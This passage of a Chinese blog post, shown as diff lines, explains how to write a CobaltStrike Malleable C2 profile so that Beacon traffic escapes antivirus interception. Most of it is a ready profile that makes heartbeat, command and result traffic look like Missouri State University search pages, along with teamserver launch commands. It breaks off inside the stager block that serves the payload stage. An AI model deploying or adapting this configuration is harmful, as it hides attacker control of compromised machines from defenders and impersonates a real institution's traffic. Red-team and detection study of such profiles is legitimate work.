-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/cobaltstrike/" itemprop="url" rel="index">
-                    <span itemprop="name">cobaltstrike</span>
-                  </a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​        通过之前我们对于CobaltStrike的Beacon通信流程分析，我们可以看到CobaltStrike在使用心跳包发送active和match，执行命令的返回结果通过请求submit.php来进行传输，而且我们通过这两个包发送和接收的也是一些加密的内容，因此可能有些杀软可能会对这样的请求进行拦截，如果这样，那么无论我们之前对shellcode怎么免杀，只要和服务端产生一些通信，那么都有可能被拦截，因此我们需要修改掉这些流量特征，好在CobaltStrike已经给我们提供了这样的功能，那就是malleable C2。</p>
-<h3 id="关于malleable-C2基本介绍"><a href="#关于malleable-C2基本介绍" class="headerlink" title="关于malleable C2基本介绍"></a>关于malleable C2基本介绍</h3><p><strong>什么是malleable C2?</strong></p>
-<p>​        Beacon的HTTP的indicators由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。 也就是说当Beacon使用HTTP进行通信时，可以通过Malleable-C2来控制如何接收和发送指令。</p>
-<p><strong>为什么要使用malleable C2?</strong></p>
-<p>​        因为我们使用默认beacon通信方式可以看到存在一些特征，所以我们需要通过需改Malleable-C2来更改流量的特征，让beacon和CoblatStrike服务端的通信流量尽量来模拟正常的访问通信，要实现这个功能，可以通过编写malleable-C2-profile来实现。</p>
-<h3 id="malleable-C2-profile的编写分析"><a href="#malleable-C2-profile的编写分析" class="headerlink" title="malleable C2-profile的编写分析"></a>malleable C2-profile的编写分析</h3><p><strong>如何使用malleable C2-profile文件?</strong></p>
-<p>​        我以网上公开的profile为例进行分析，<a href="https://github.com/xx0hcd/Malleable-C2-Profiles" target="_blank" rel="noopener">github地址</a>,下载后normal\msu_edu.profile来进行分析</p>
-<p>​        当我们启动团队服务器时，可以使用如下命令来加载Malleable-C2-profile文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;teamserver [external IP] [password] [&#x2F;path&#x2F;to&#x2F;my.profile]</span><br></pre></td></tr></table></figure>
-
-<p>​        将normal\msu_edu.profile上传到服务器，使用上面的命令可以加载，但是在加载之前首先要测试这个profile文件的内容格式是否有问题，可以通过c2lint命令来检测</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;c2lint xxxx.profile</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170520452.png" alt="image-20200902170520452"></p>
-<p>​        测试过程中+代表测试通过，%代表提醒的内容，！代表不通过的选项</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170554118.png" alt="image-20200902170554118"></p>
-<p>​        检查通过以后，我们通过下面的命令启动teamserver并且加载 malleable-C2-profile文件 </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo .&#x2F;teamserver  ip password msu_edu.profile</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902170742151.png" alt="image-20200902170742151"></p>
-<p><strong>如何编写一个Malleable-C2-profile文件？</strong></p>
-<p>​        打开后文件的开头如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">###Global Options###</span><br><span class="line">set sample_name &quot;msu_edu.profile&quot;;  &#x2F;&#x2F;通过set给变量sample_name进行赋值</span><br><span class="line"></span><br><span class="line">set sleeptime &quot;37500&quot;;   &#x2F;&#x2F;设置睡眠时间为37秒左右</span><br><span class="line">set jitter    &quot;33&quot;;     &#x2F;&#x2F;设置抖动率，为了防止请求时间过于规律，在这里设置抖动率为33%</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1) AppleWebKit&#x2F;587.38 (KHTML, like Gecko)   Chrome&#x2F;41.0.2228.0 Safari&#x2F;537.36&quot;;  &#x2F;&#x2F;设置user-agent</span><br><span class="line"></span><br><span class="line">#set host_stage &quot;false&quot;;  &#x2F;&#x2F;如果不需要分阶段传输payload，就可以在这里将host_stage的值设置为false</span><br><span class="line"></span><br><span class="line">###DNS options###</span><br><span class="line">set dns_idle &quot;8.8.8.8&quot;;   </span><br><span class="line">set maxdns    &quot;245&quot;;  &#x2F;&#x2F;通过dns传输数据时主机名的最大长度</span><br><span class="line">set dns_sleep &quot;0&quot;; &#x2F;&#x2F;在每个dns请求之间设置延时，这里没有延时</span><br><span class="line">set dns_stager_prepend &quot;&quot;; &#x2F;&#x2F;在dns payload之前插入内容</span><br><span class="line">set dns_stager_subhost &quot;&quot;; &#x2F;&#x2F;设置dns txt record stager的子域名</span><br><span class="line">set dns_max_txt &quot;252&quot;; &#x2F;&#x2F;设置dns txt返回最大长度</span><br><span class="line">set dns_ttl &quot;1&quot;; &#x2F;&#x2F;设置DNS响应的ttl的值</span><br><span class="line"></span><br><span class="line">###SMB options###</span><br><span class="line">set pipename &quot;ntsvcs&quot;;  &#x2F;&#x2F;在使用Smb beacon来进行通信时，设置命名管道的名字</span><br><span class="line">set pipename_stager &quot;scerpc&quot;;  &#x2F;&#x2F;设置stager使用的管道名</span><br><span class="line"></span><br><span class="line">###TCP options###</span><br><span class="line">set tcp_port &quot;8000&quot;;  &#x2F;&#x2F;设置tcp_beacon监听的端口，这里设置的是8000</span><br></pre></td></tr></table></figure>
-
-<p>​        通过上面的配置，我们实现了以37秒为基准，百分之33左右的抖动率的功能，并且使用smb beacon时，默认的命名管道名字为ntsvcs</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171550504.png" alt="image-20200902171550504"></p>
-<p>​        当使用tcp beacon时，默认的端口是8000</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902171657470.png" alt="image-20200902171657470"></p>
-<p>​        并且默认的user-agent将使用我们上面配置的.</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172224238.png" alt="image-20200902172224238">    </p>
-<p>​        我们继续分析，看看后面的配置文件,下面的配置文件主要用来配置证书和response header</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">###SSL Options### &#x2F;&#x2F;这个主要是给https beacon使用的配置</span><br><span class="line">#https-certificate &#123;</span><br><span class="line">    #set keystore &quot;your_store_file.store&quot;;  &#x2F;&#x2F;java kerstore文件</span><br><span class="line">    #set password &quot;your_store_pass&quot;; &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#https-certificate &#123;  &#x2F;&#x2F;自签名的https证书配置</span><br><span class="line">#    set C &quot;US&quot;;   &#x2F;&#x2F;国家</span><br><span class="line">#    set CN &quot;whatever.com&quot;; &#x2F;&#x2F;域名</span><br><span class="line">#    set L &quot;California&quot;; &#x2F;&#x2F;地区</span><br><span class="line">#    set O &quot;whatever LLC.&quot;;  &#x2F;&#x2F;组织名</span><br><span class="line">#    set OU &quot;local.org&quot;; &#x2F;&#x2F;组织单位名称</span><br><span class="line">#    set ST &quot;CA&quot;; &#x2F;&#x2F;州或者省</span><br><span class="line">#   set validity &quot;365&quot;; &#x2F;&#x2F;时效</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">#code-signer &#123;  &#x2F;&#x2F;代码签名</span><br><span class="line">    #set keystore &quot;your_keystore.jks&quot;; &#x2F;&#x2F; java kerstore文件</span><br><span class="line">    #set password &quot;your_password&quot;;  &#x2F;&#x2F;keystore文件的打开密码</span><br><span class="line">    #set alias &quot;server&quot;;  &#x2F;&#x2F;</span><br><span class="line">#&#125;</span><br><span class="line"></span><br><span class="line">###HTTP-Config Block###  &#x2F;&#x2F;配置reponse header块</span><br><span class="line">http-config &#123;</span><br><span class="line">    #set headers &quot;Server, Content-Type&quot;;  </span><br><span class="line">    #header &quot;Content-Type&quot; &quot;text&#x2F;html;charset&#x3D;UTF-8&quot;;</span><br><span class="line">    #header &quot;Server&quot; &quot;nginx&quot;;</span><br><span class="line"></span><br><span class="line">    set trust_x_forwarded_for &quot;false&quot;;  &#x2F;&#x2F;如果teamserver使用了http重定向器，就需要选择true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        下面我们来配置GET请求</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-GET Block###</span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;siteindex&#x2F;a&#x2F; &#x2F;siteindex&#x2F;b&#x2F; &#x2F;siteindex&#x2F;c&#x2F;&quot;;  &#x2F;&#x2F;配置请求的Uri路径</span><br><span class="line"></span><br><span class="line">    #set verb &quot;POST&quot;; &#x2F;&#x2F;用什么方法传输数据，不仅可以配置为get也可以配置为post</span><br><span class="line">    </span><br><span class="line">    client &#123;  &#x2F;&#x2F;client端的配置</span><br><span class="line"></span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.edu&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">	   </span><br><span class="line">    metadata &#123; &#x2F;&#x2F;metadata是一段加密的数据，但是没有编码，所以他不能在请求头和URI中发送。需要使用base64、base64url或者netbios编码之后才能在请求头和URI中发送。</span><br><span class="line">        #base64</span><br><span class="line">        base64url;  &#x2F;&#x2F; 使用URL-safe Base64 进行编码</span><br><span class="line">        #mask;</span><br><span class="line">        #netbios;</span><br><span class="line">        #netbiosu;</span><br><span class="line">        #prepend &quot;TEST123&quot;;  &#x2F;&#x2F;开头插入字符串</span><br><span class="line">        #append &quot;.php&quot;; &#x2F;&#x2F;末尾追加字符串</span><br><span class="line"></span><br><span class="line">        parameter &quot;filter&quot;; &#x2F;&#x2F;把数据放到名为filter的uri参数中</span><br><span class="line">        #header &quot;Cookie&quot;; &#x2F;&#x2F;把数据放到名为Cookie的http头中</span><br><span class="line">        #uri-append; &#x2F;&#x2F;把数据直接追加到URI上</span><br><span class="line"></span><br><span class="line">        #print;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;server端的请求配置</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;html; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line">        header &quot;Set-Cookie&quot; &quot;WWW-SERVERID&#x3D;handle; path&#x3D;&#x2F;&quot;;</span><br><span class="line"> </span><br><span class="line">        output &#123;</span><br><span class="line"></span><br><span class="line">            netbios;</span><br><span class="line">            #netbiosu;</span><br><span class="line">            #base64;</span><br><span class="line">            #base64url;</span><br><span class="line">            #mask;</span><br><span class="line">  </span><br><span class="line">            prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">            prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">            prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">	    prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">            prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;&gt;&lt;&#x2F;script&gt;\n&quot;;</span><br><span class="line">            append &quot;&lt;h2&gt;About search&lt;&#x2F;h2&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutwebsearch.htm\&quot;&gt;About web search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;]n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutpeoplesearch.htm\&quot;&gt;About people search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;abouteventsearch.htm\&quot;&gt;About event search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;li&gt;&lt;a href&#x3D;\&quot;https:&#x2F;&#x2F;www.missouristate.edu&#x2F;web&#x2F;search&#x2F;aboutmapsearch.htm\&quot;&gt;About map search&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;ul&gt;\n&quot;;</span><br><span class="line">	    append &quot;&lt;&#x2F;div&gt;&quot;;</span><br><span class="line"></span><br><span class="line">            print;  &#x2F;&#x2F;以print为结束</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​        通过上面的HTTP-GET块的配置，我们配置了心跳包的请求URI为/siteindex/a/，并且设置了通过filter字段来传输信息，并且返回包的内容也和我们在server部分的配置相同。这里有一个点需要注意，就是在使用prepend在返回包中添加内容时，在多个prepend字段配置中,prepend字段添加的越早，显示时越在后面</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">       prepend &quot;    &lt;link href&#x3D;\&quot;&#x2F;resource&#x2F;styles\&quot; media&#x3D;\&quot;all\&quot; rel&#x3D;\&quot;stylesheet\&quot; &#x2F;&gt;    &lt;script src&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;scripts&#x2F;2018&#x2F;common.js?_q&#x3D;&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;robots\&quot; content&#x3D;\&quot;noindex\&quot; &#x2F;&gt;&lt;link rel&#x3D;\&quot;Stylesheet\&quot; media&#x3D;\&quot;all\&quot; href&#x3D;\&quot;https:&#x2F;&#x2F;missouristate.info&#x2F;styles&#x2F;msuwds&#x2F;main-sgf.css\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta name&#x3D;\&quot;vireport\&quot; content&#x3D;\&quot;width&#x3D;device-width, initial-scale&#x3D;1.0\&quot; &#x2F;&gt;\n&quot;;   </span><br><span class="line">       prepend &quot;    &lt;title&gt;A - Site Index - Missouri State University&lt;&#x2F;title&gt;\n&quot;;</span><br><span class="line">       prepend &quot;    &lt;meta charset&#x3D;\&quot;UTF-8\&quot; &#x2F;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;head&gt;&quot;;     	       </span><br><span class="line">prepend &quot;&lt;html lang&#x3D;\&quot;en\&quot; itemscope itemtype&#x3D;\&quot;https:&#x2F;&#x2F;schema.org&#x2F;SearchResultsPage\&quot;&gt;\n&quot;;</span><br><span class="line">       prepend &quot;&lt;!DOCTYPE html&gt;\n&quot;;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902172951017.png" alt="image-20200902172951017"></p>
-<p>​        我们再看一下当我们向client发送指令时的数据包,我们可以看到server端传递的请求在参数q中</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180603819.png" alt="image-20200902180603819"></p>
-<p>​        当客户端收到指令时，一般通过post来向服务端返回命令执行的结果，这部分可以通过http-post部分来配置，配置过程如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Post Block###</span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;getsearchresults&quot;;  &#x2F;&#x2F;配置post请求的uri</span><br><span class="line">    #set verb &quot;GET&quot;;</span><br><span class="line">    set verb &quot;POST&quot;;  &#x2F;&#x2F;配置请求的形式</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">#	header &quot;Host&quot; &quot;search.missouristate.edu&quot;;    &#x2F;&#x2F;配置请求头的信息</span><br><span class="line">	header &quot;Connection&quot; &quot;close&quot;;  </span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en-US&quot;;   </span><br><span class="line">        </span><br><span class="line">        output &#123;</span><br><span class="line">            base64url;   &#x2F;&#x2F; URL-safe Base64 编码形式输出</span><br><span class="line">	    parameter &quot;site_indexFilter&quot;;  &#x2F;&#x2F;将数据放到site_indexFilter参数中进行传输</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        id &#123; &#x2F;&#x2F;通过id标识应该输出到哪个beacon</span><br><span class="line">	    base64url;   </span><br><span class="line">	    parameter &quot;peopleFilter&quot;;  &#x2F;&#x2F;将数据放到peopleFilter参数中进行传输</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    parameter &quot;eventsFilter&quot; &quot;campus:sgf&quot;;    &#x2F;&#x2F;配置一些其他的请求参数和参数值</span><br><span class="line">#    parameter &quot;mapFilter&quot; &quot;campus&quot;;</span><br><span class="line">    parameter &quot;query&quot; &quot;my%20missouri%20state&quot;;</span><br><span class="line">    parameter &quot;resultCounts&quot; &quot;5,3,3,3&amp;&quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;application&#x2F;json; charset&#x3D;utf-8&quot;;</span><br><span class="line">        header &quot;Vary&quot; &quot;User-Agent,AcceptEncoding&quot;;</span><br><span class="line">        header &quot;Server&quot; &quot;Microsoft-IIS&#x2F;8.5&quot;;</span><br><span class="line">        header &quot;BackendServer&quot; &quot;Handle&quot;;</span><br><span class="line">        header &quot;X-UA-Compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            netbios;  &#x2F;&#x2F;通过netbios传输信息 </span><br><span class="line">	   </span><br><span class="line">	    prepend &quot;[\&quot;&#123;\\\&quot;results\\\&quot;:[\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State University Foundation\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;www.missouristatefoundation.org&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:&quot;;</span><br><span class="line"></span><br><span class="line">	    append &quot;\&quot;\\\\\\\&quot;development; endowment; foundation; Foundation, Missouri State; fundraising; missouri state foundation; missouri state university foundation\\\\\\\&quot;,\\\\\\\&quot;UnitType\\\\\\\&quot;:\\\\\\\&quot;Department\\\\\\\&quot;&#125;\\\&quot;,\\\&quot;&#123;\\\\\\\&quot;ID\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Name\\\\\\\&quot;:\\\\\\\&quot;Missouri State Outreach\\\\\\\&quot;,\\\\\\\&quot;Url\\\\\\\&quot;:\\\\\\\&quot;https:&#x2F;&#x2F;outreach.missouristate.edu&#x2F;\\\\\\\&quot;,\\\\\\\&quot;Keywords\\\\\\\&quot;:\\\\\\\&quot;distance learning; dual credit; evening; extended campus; Extended Campus (now Missouri State Outreach); i courses; i-courses; icourses; interactive video; itv; non credit; non-credit; noncredit; off campus; off-campus; offcampus; online; outreach; Outreach, Missouri State\\\\\\\&quot;&#125;\&quot;]&quot;;</span><br><span class="line"></span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​         通过上面对于http-post的配置，我们可以看到通过post的方式请求getsearchresults这个uri,并且在请求中加入了site_indexFilter字段，这个字段用来传输命令执行的结果。通过peopleFilter这个字段来返回beacon client对应的id。并且加上了query和resultCounts这两个参数，不过这两个参数的内容都是写死的。最后在server部分我们配置了返回的内容。我们使用wireshark来看下请求的内容与我们的配置是否一致</p>
-<p><img src="/2020/09/02/%E5%85%B3%E4%BA%8EMalleable-C2%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/image-20200902180954689.png" alt="image-20200902180954689"></p>
-<p>​        下面我们配置http-stager的信息，我们可以在下面的代码块中定义自己下载stage的行为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">###HTTP-Stager Block###</span><br><span class="line">http-stager &#123;</span><br><span class="line"></span><br><span class="line">    set uri_x86 &quot;&#x2F;Events&quot;;  &#x2F;&#x2F;当下在x86的stage时，请求的uri</span><br><span class="line">    set uri_x64 &quot;&#x2F;events&quot;;  &#x2F;&#x2F;当下在x64的stage时，请求的uri</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line">        header &quot;Host&quot; &quot;search.missouristate.com&quot;;</span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Accept-Language&quot; &quot;en&quot;;</span><br><span class="line">        header &quot;Connection&quot; &quot;close&quot;;</span><br><span class="line"></span><br><span class="line">        #parameter &quot;test1&quot; &quot;test2&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;  &#x2F;&#x2F;配置server返回stage的格式</span><br><span class="line">        header &quot;Cache-Control&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;private&quot;;</span><br><span class="line">        header &quot;Vary&quot; 